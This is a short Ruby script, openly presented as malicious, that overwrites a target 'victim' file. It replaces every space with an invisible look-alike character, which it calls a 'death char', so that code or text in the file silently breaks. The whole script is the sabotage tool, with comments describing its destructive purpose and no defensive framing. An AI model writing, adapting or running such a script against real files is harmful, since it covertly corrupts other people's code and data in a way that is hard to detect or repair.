deathChar = " "							      # Alt code death char - ("invisible character")

fileName = "VICTIM_FILE.extension" # Declare the file name that you want destroyed
file = File.open(fileName)				 # Open the file for modification
contents = File.read(file)				 # Save file contents to temporary variable
file.close								         

contents = contents.tr(" ",deathChar)	# Replace contents of the file with malicious code

fileModified = File.new(fileName,'w')	# Reopen file for writing
fileModified.puts(contents)				    # Refill file with new malicious code
fileModified.close						        
